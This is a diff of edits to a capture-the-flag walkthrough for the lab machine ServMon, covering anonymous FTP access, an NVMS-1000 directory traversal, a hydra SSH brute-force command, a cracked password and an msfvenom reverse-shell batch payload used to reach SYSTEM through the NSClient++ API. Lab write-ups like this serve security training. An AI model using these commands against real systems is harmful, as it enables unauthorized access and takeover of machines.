@@ -91,7 +91,7 @@ There are many ports open. FTP allows anonymous access so let's start with this 
 
 ## Enumerating FTP
 
-Connect with to FTP with this command.
+Connect to FTP with this command.
 
 `ftp 10.10.10.184`
 
@@ -127,17 +127,19 @@ Regards
 Nadine
 ```
 
-Now, other than getting two possible usernames, we also know the file path to Nathan's password file. 
+Now, other than getting two possible usernames, we also have some information the allows us to guess the path to Nathan's password file. 
 
 Let's hope it's still there when we get to it.
 
 ## Exploiting NVMS Directory Traversal
 
+Next, let's check out the web server at port 80.
+
 [NVMS-1000](http://en.tvt.net.cn/products/188.html) is a monitoring client for network video surveillance.
 
 ![NVMS-1000](images/servmon/nvms.png)
 
-It is vulnerable to a [directory traversal attack](https://www.exploit-db.com/exploits/47774). Using the information in the PoC, we can carry out the attack with Burp.
+It is vulnerable to a directory traversal attack. Using the information in the [PoC](https://www.exploit-db.com/exploits/47774), we can carry out the attack with Burp.
 
 First, let's test if the installation is vulnerable.
 
@@ -177,7 +179,7 @@ Gr4etN3w5w17hMySk1Pa5$
 We can use these information to bruteforce the SSH service with hydra.
 
 ```
-# hydra -l nadine -P nathanpasswords 10.10.10.184 -t 4 ssh
+# hydra -L user.txt -P password.txt 10.10.10.184 -t 4 ssh
 
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 <SNIP>
@@ -258,7 +260,7 @@ We also note that the allowed hosts point to **local host**. This means that we 
 
 Since, we do not have access to the GUI locally, let's try using the [API](https://docs.nsclient.org/api/rest/scripts/) to complete the attack. `curl` is conveniently installed on Servmon.
 
-First, let's prepare a batch file **payload** with msfvenom.
+First, let's prepare a batch file `payload` with msfvenom.
 
 `# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.X.X LPORT=8888 -f bat > sorryforthis.bat`
 
@@ -298,6 +300,6 @@ nt authority\system
 
 # Thoughts
 
-I also tried out local port forwarding with this box. You will need it if you want to exploit via the GUI or if curl is not available on the victim machine.
+I also tried the privilege escalation through port forwarding with this box. You will need it if you want to exploit via the GUI.
 
 However, you don't need it if you're exploiting locally via the API.
